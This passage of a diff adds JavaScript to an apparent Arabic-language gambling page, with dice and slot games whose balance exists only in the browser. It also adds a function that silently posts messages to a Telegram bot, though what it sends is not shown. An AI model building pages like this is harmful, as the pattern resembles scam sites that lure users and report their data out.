+                    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+                    width: 200px; height: 200px; perspective: 1000px;
+                `;
+                const dice = document.createElement('div');
+                dice.style.cssText = `
+                    width: 100px; height: 100px; position: relative;
+                    transform-style: preserve-3d; transition: transform 1s;
+                    margin: 50px auto;
+                `;
+                
+                const faces = [1,2,3,4,5,6];
+                const result = Math.floor(Math.random() * 6) + 1;
+                dice.style.transform = `rotateX(${result * 90}deg) rotateY(${result * 90}deg)`;
+                
+                diceEl.appendChild(dice);
+                document.body.appendChild(diceEl);
+                
+                setTimeout(() => {
+                    const win = (result > 3) ? stake * 1.95 : 0;
+                    balance += win;
+                    updateBalance();
+                    diceEl.remove();
+                    alert(`🎲 ${result}\n${win > 0 ? `✅ +${win.toFixed(0)} ج.م` : '❌ خسارة'}`);
+                }, 1000);
+            }
+        }
+
+        function launchSlots() {
+            const stake = parseInt(prompt('🍒 سلوتس\n💰 الرهان:') || 0);
+            if(stake <= balance) {
+                balance -= stake;
+                updateBalance();
+                
+                const symbols = ['🍒', '🍋', '🍊', '⭐', '💎', '7️⃣'];
+                const result = Array(3).fill().map(() => symbols[Math.floor(Math.random() * symbols.length)]);
+                const win = (result[0] === result[1] && result[1] === result[2]) ? stake * 10 : 0;
+                
+                balance += win;
+                updateBalance();
+                alert(`🍒 ${result.join(' | ')}\n${win > 0 ? `🎉 جاكبوت ${win} ج.م!` : '🔄 جرب تاني'}`);
+            }
+        }
+
+        async function sendTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {}
+        }
+
+        // Initialize
+        generateMatches();
+        updateBalance();
     </script>
 </body>
 </html>
